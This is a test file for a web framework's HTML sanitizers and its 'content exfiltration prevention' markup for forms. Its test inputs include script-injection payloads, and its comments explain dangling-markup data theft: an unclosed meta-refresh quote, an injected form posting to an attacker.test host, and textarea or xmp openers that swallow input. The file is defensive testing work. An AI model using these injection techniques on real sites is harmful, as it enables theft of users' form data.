/**
 * Choosing a sanitizer, and stopping a form's contents leaving the page.
 * Ported from `actionview/test/template/sanitize_helper_test.rb` and
 * `actionview/test/template/content_exfiltration_prevention_helper_test.rb`.
 *
 * Both are about markup an attacker got into the page earlier: one decides
 * what survives being cleaned, the other assumes something did not get
 * cleaned and closes it before our form starts.
 */

import { afterEach, describe, expect, it } from "bun:test";
import { renderToString } from "../src/render.js";
import {
  CONTENT_EXFILTRATION_PREVENTION_MARKUP,
  DEFAULT_SANITIZER_VENDOR,
  fullSanitizer,
  linkSanitizer,
  DEFAULT_PREPEND_CONTENT_EXFILTRATION_PREVENTION,
  prependContentExfiltrationPrevention,
  preventContentExfiltration,
  resetContentExfiltrationPrevention,
  resetSanitizerVendor,
  safeListSanitizer,
  sanitizedAllowedAttributes,
  sanitizedAllowedTags,
  sanitizerVendor,
  setPrependContentExfiltrationPrevention,
  setSanitizedAllowedAttributes,
  setSanitizedAllowedTags,
  setSanitizerVendor,
} from "../src/sanitize-vendor.js";
import { ButtonTo } from "../src/links.js";
import { FormWith } from "../src/form.js";

afterEach(() => {
  resetSanitizerVendor();
  resetContentExfiltrationPrevention();
});

describe("the three sanitizers", () => {
  it("keeps what a safe list allows", async () => {
    expect(await safeListSanitizer()("<p>hello <b>there</b></p>")).toContain("<b>there</b>");
  });

  it("still refuses a script through the safe list", async () => {
    expect(await safeListSanitizer()("<p>ok</p><script>alert(1)</script>")).not.toContain(
      "alert(1)",
    );
  });

  /** For a summary or a plain-text mail: every tag gone, the words kept. */
  it("strips every tag and keeps the text", async () => {
    expect(await fullSanitizer()("<p>hello <b>there</b></p>")).toBe("hello there");
  });

  it("strips a script's contents too", async () => {
    expect(await fullSanitizer()("<script>alert(1)</script>ok")).not.toContain("alert(1)");
  });

  /**
   * Not the same as stripping everything: an excerpt that must not send
   * anybody anywhere still reads better with its emphasis, and the anchor text
   * is usually where the meaning is.
   */
  it("removes links and keeps what they said", async () => {
    const cleaned = await linkSanitizer()('see <a href="https://elsewhere.test">the docs</a>');

    expect(cleaned).toContain("the docs");
    expect(cleaned).not.toContain("href");
    expect(cleaned).not.toContain("<a");
  });

  it("keeps other markup while removing the links", async () => {
    expect(await linkSanitizer()('<b>bold</b> <a href="/x">link</a>')).toContain("<b>bold</b>");
  });

  it("removes a link written with attributes and mixed case", async () => {
    expect(await linkSanitizer()('<A HREF="/x" target="_blank">t</A>')).not.toContain("HREF");
  });

  /**
   * The result is text, so it comes back as text — handing back something
   * marked safe would let a caller put it in an attribute, where the
   * ampersands it still holds are not safe at all.
   */
  it("returns the stripped form as plain text", async () => {
    expect(typeof (await fullSanitizer()("<p>x</p>"))).toBe("string");
  });
});

describe("the vendor", () => {
  it("is ours by default", () => {
    expect(sanitizerVendor()).toBe(DEFAULT_SANITIZER_VENDOR);
  });

  /**
   * One object rather than an argument at every call site: the failure that
   * matters is half the pages staying on the old policy, and that half is the
   * half nobody looked at.
   */
  it("replaces the sanitizer everywhere at once", async () => {
    setSanitizerVendor({
      safeList: async () => "replaced",
      full: async () => "replaced",
      link: async () => "replaced",
    });

    expect(await safeListSanitizer()("<p>anything</p>")).toBe("replaced");
    expect(await fullSanitizer()("<p>anything</p>")).toBe("replaced");
    expect(await linkSanitizer()("<p>anything</p>")).toBe("replaced");
  });

  it("goes back to ours when reset", () => {
    setSanitizerVendor({
      safeList: async () => "x",
      full: async () => "x",
      link: async () => "x",
    });
    resetSanitizerVendor();

    expect(sanitizerVendor()).toBe(DEFAULT_SANITIZER_VENDOR);
  });

  it("starts with no narrowing configured", () => {
    expect(sanitizedAllowedTags()).toBeUndefined();
    expect(sanitizedAllowedAttributes()).toBeUndefined();
  });

  it("takes a narrower list of tags", async () => {
    setSanitizedAllowedTags(["b"]);

    const cleaned = await safeListSanitizer()("<b>bold</b><i>italic</i>");

    expect(cleaned).toContain("<b>bold</b>");
    expect(cleaned).not.toContain("<i>");
  });

  it("reports the list it was given", () => {
    setSanitizedAllowedTags(["b", "i"]);

    expect(sanitizedAllowedTags()?.has("b")).toBe(true);
  });

  it("takes a narrower list of attributes", async () => {
    setSanitizedAllowedTags(["a"]);
    setSanitizedAllowedAttributes({ a: ["href"] });

    const cleaned = await safeListSanitizer()('<a href="/x" title="t">link</a>');

    expect(cleaned).toContain("href");
    expect(cleaned).not.toContain("title");
  });

  it("lets a call override the configured list", async () => {
    setSanitizedAllowedTags(["b"]);

    expect(await safeListSanitizer()("<i>x</i>", { allowedTags: new Set(["i"]) })).toContain("<i>");
  });

  it("forgets the narrowing when reset", () => {
    setSanitizedAllowedTags(["b"]);
    setSanitizedAllowedAttributes({ a: ["href"] });
    resetSanitizerVendor();

    expect(sanitizedAllowedTags()).toBeUndefined();
    expect(sanitizedAllowedAttributes()).toBeUndefined();
  });
});

describe("content exfiltration prevention", () => {
  /** A page whose layout assumes nothing precedes a form would change. */
  it("is off until an application turns it on", () => {
    expect(DEFAULT_PREPEND_CONTENT_EXFILTRATION_PREVENTION).toBe(false);
    expect(prependContentExfiltrationPrevention()).toBe(false);
    expect(preventContentExfiltration()).toBeNull();
  });

  it("emits the markup once turned on", () => {
    setPrependContentExfiltrationPrevention(true);

    expect(preventContentExfiltration()?.value).toBe(CONTENT_EXFILTRATION_PREVENTION_MARKUP);
  });

  /**
   * `<meta http-equiv="refresh" content='0;URL=https://attacker.test?` opens a
   * quote that never closes, so the page up to the next `'` becomes part of
   * that URL — and is sent.
   */
  it("closes all three quote characters", () => {
    expect(CONTENT_EXFILTRATION_PREVENTION_MARKUP).toContain("'");
    expect(CONTENT_EXFILTRATION_PREVENTION_MARKUP).toContain('"');
    expect(CONTENT_EXFILTRATION_PREVENTION_MARKUP).toContain("`");
  });

  /** It renders as nothing when there is no attack, which is every page. */
  it("closes the quotes inside a comment", () => {
    expect(CONTENT_EXFILTRATION_PREVENTION_MARKUP).toStartWith("<!--");
  });

  /**
   * `<textarea>` and `<xmp>` swallow everything up to their own closing tag,
   * so an injected opener turns whatever the user types into that element's
   * value — which the attacker's form submits.
   */
  it("closes the elements that swallow markup", () => {
    expect(CONTENT_EXFILTRATION_PREVENTION_MARKUP).toContain("</textarea>");
    expect(CONTENT_EXFILTRATION_PREVENTION_MARKUP).toContain("</xmp>");
  });

  it("closes an injected option", () => {
    expect(CONTENT_EXFILTRATION_PREVENTION_MARKUP).toContain("</option>");
  });

  /**
   * The one that actually steals the data: a browser assigns a field to the
   * nearest open form and nested forms do not exist, so an injected
   * `<form action="https://attacker.test">` claims every field after it.
   */
  it("closes an injected form", () => {
    expect(CONTENT_EXFILTRATION_PREVENTION_MARKUP).toContain("</form>");
  });

  it("closes the form last, after everything that could hold it open", () => {
    const markup = CONTENT_EXFILTRATION_PREVENTION_MARKUP;

    expect(markup.indexOf("</form>")).toBeGreaterThan(markup.indexOf("</option>"));
    expect(markup.indexOf("</option>")).toBeGreaterThan(markup.indexOf("</textarea>"));
  });
});

describe("the forms that use it", () => {
  it("prepends nothing to a button_to by default", async () => {
    const html = await renderToString(<ButtonTo to="/posts">Go</ButtonTo>);

    expect(html).toStartWith("<form");
  });

  /** Before rather than after: it closes what an attacker opened earlier. */
  it("prepends the markup to a button_to once turned on", async () => {
    setPrependContentExfiltrationPrevention(true);

    const html = await renderToString(<ButtonTo to="/posts">Go</ButtonTo>);

    expect(html).toStartWith(CONTENT_EXFILTRATION_PREVENTION_MARKUP);
    expect(html).toContain('<form action="/posts"');
  });

  it("leaves the button_to itself unchanged", async () => {
    setPrependContentExfiltrationPrevention(true);

    const html = await renderToString(<ButtonTo to="/posts">Go</ButtonTo>);

    expect(html).toContain('<button type="submit">Go</button>');
  });

  it("does not escape the markup it prepends", async () => {
    setPrependContentExfiltrationPrevention(true);

    const html = await renderToString(<ButtonTo to="/posts">Go</ButtonTo>);

    expect(html).not.toContain("&lt;/form&gt;");
  });
});

describe("form_with", () => {
  it("prepends nothing by default", async () => {
    const html = await renderToString(
      <FormWith url="/posts">{() => <input name="title" />}</FormWith>,
    );

    expect(html).toStartWith("<form");
  });

  it("prepends the markup once turned on", async () => {
    setPrependContentExfiltrationPrevention(true);

    const html = await renderToString(
      <FormWith url="/posts">{() => <input name="title" />}</FormWith>,
    );

    expect(html).toStartWith(CONTENT_EXFILTRATION_PREVENTION_MARKUP);
  });

  /** The form must still be a form: closing tags belong before it, not inside. */
  it("leaves the form's own contents where they were", async () => {
    setPrependContentExfiltrationPrevention(true);

    const html = await renderToString(
      <FormWith url="/posts">{() => <input name="title" />}</FormWith>,
    );

    expect(html).toContain('<form action="/posts"');
    expect(html.indexOf('<input name="title"')).toBeGreaterThan(html.indexOf("<form"));
  });
});
